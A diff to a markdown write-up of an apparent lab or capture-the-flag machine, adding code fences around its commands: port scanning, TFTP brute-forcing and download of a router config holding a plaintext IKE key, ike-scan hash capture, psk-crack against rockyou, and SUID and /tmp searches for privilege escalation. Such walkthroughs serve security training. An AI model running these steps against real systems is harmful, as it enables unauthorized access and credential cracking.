@@ -18,7 +18,9 @@ TFTP (69/udp)
 
 ## 1. Enumeration
 Port Scan
+```
 nmap -Pn -p- --min-rate 3000 10.10.11.87
+```
 
 
 Open Ports:
@@ -33,10 +35,12 @@ Open Ports:
 
 ## 2. TFTP Enumeration (Initial Access Vector)
 Identify exposed files
+```
 msfconsole
 use auxiliary/scanner/tftp/tftpbrute
 set RHOSTS 10.10.11.87
 run
+```
 
 
 Discovered file:
@@ -44,8 +48,10 @@ Discovered file:
 ciscortr.cfg
 
 Download configuration
+```
 tftp 10.10.11.87
 get ciscortr.cfg
+```
 
 ## 3. Credential Discovery
 Extract credentials from config
@@ -61,10 +67,14 @@ The IKE pre-shared key is present in plaintext.
 
 ## 4. IKE PSK Cracking
 Extract IKE hash
+```
 ike-scan -M 10.10.11.87 > hash.txt
+```
 
 Crack PSK
+```
 psk-crack -d /usr/share/wordlists/rockyou.txt hash.txt
+```
 
 
 Recovered PSK:
@@ -92,7 +102,9 @@ id
 uid=1001(ike) gid=1001(ike) groups=1001(ike),13(proxy)
 
 SUID binaries
+```
 find / -perm -4000 -type f 2>/dev/null
+```
 
 
 Notable:
@@ -106,7 +118,9 @@ Key Observation
 
 A root-owned script was found in /tmp, a world-writable and executable directory.
 
+```
 ls -la /tmp
+```
 
 
 The script was:
